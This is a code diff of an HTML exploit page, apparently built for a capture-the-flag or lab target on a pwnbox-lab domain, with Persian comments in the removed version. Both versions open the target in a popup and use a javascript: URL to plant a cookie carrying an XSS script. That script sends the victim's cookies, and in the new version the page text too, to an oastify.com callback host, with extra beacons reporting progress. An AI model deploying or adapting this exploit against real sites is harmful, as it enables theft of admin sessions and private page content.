@@ -1,39 +1,45 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Exploit</title>
+  <meta charset="UTF-8">
+  <title>Exploit</title>
 </head>
 <body>
-    <h1>Exploiting... Please wait.</h1>
-    <script>
-        // آدرس‌های خودت را جایگزین کن:
-        const TARGET_ORIGIN = "https://a28a7e0b9340.pwnbox-lab.com";
-        const OAST_URL = "https://sokap4s24zfb4z4yrcu3sqeycpig68ux.oastify.com";
+  <h1>Loading...</h1>
 
-        // ۱. اطلاع دادن به خودت که ادمین صفحه را باز کرده است
-        fetch(`${OAST_URL}/admin-landed`);
+  <script>
+    const TARGET_ORIGIN = "https://a28a7e0b9340.pwnbox-lab.com/";
+    const OAST_URL = "https://323l3f6diatmiai95n8e61s9q0wrkk89.oastify.com";
 
-        // ۲. باز کردن صفحه هدف در یک پنجره جدید (یا Tab جدید)
-        const victimWindow = window.open(`${TARGET_ORIGIN}/`);
+    fetch(OAST_URL + "/admin-landed").catch(() => {});
 
-        // ۳. کمی صبر می‌کنیم تا صفحه کاملاً لود شود
-        setTimeout(() => {
-            if (victimWindow) {
-                // ۴. با تغییر location به یک javascript URL، کوکی را روی دامنه هدف ست می‌کنیم
-                // این اسکریپت پس از ست کردن کوکی، صفحه را مجدداً لود می‌کند تا کوکی جدید رندر شود
-                const payload = `javascript:(function(){
-                    document.cookie = "a=<script>window.postMessage(\\`fetch('${OAST_URL}/?flag='+encodeURIComponent(document.cookie))\\`, '*');<\\/script>; path=/; max-age=3600";
-                    location.reload();
-                })();`;
-                
-                victimWindow.location.href = payload;
-                fetch(`${OAST_URL}/payload-sent`);
-            } else {
-                fetch(`${OAST_URL}/popup-blocked`);
-            }
-        }, 2000);
-    </script>
+    const victimWindow = window.open(TARGET_ORIGIN + "/");
+
+    setTimeout(() => {
+      if (!victimWindow) {
+        fetch(OAST_URL + "/popup-blocked").catch(() => {});
+        return;
+      }
+
+      const xssPayload =
+        "<script>" +
+        "window.postMessage(" +
+        JSON.stringify(
+          "fetch('" + OAST_URL + "/?c='+encodeURIComponent(document.cookie)+'&b='+encodeURIComponent(document.body.innerText))"
+        ) +
+        ", '*')" +
+        "<\/script>";
+
+      const cookieString = "a=" + xssPayload + "; path=/; max-age=3600";
+
+      const jsCode =
+        "document.cookie=" + JSON.stringify(cookieString) + ";" +
+        "location.href=" + JSON.stringify(TARGET_ORIGIN + "/") + ";";
+
+      victimWindow.location.href = "javascript:" + jsCode;
+
+      fetch(OAST_URL + "/payload-sent").catch(() => {});
+    }, 2000);
+  </script>
 </body>
 </html>
-
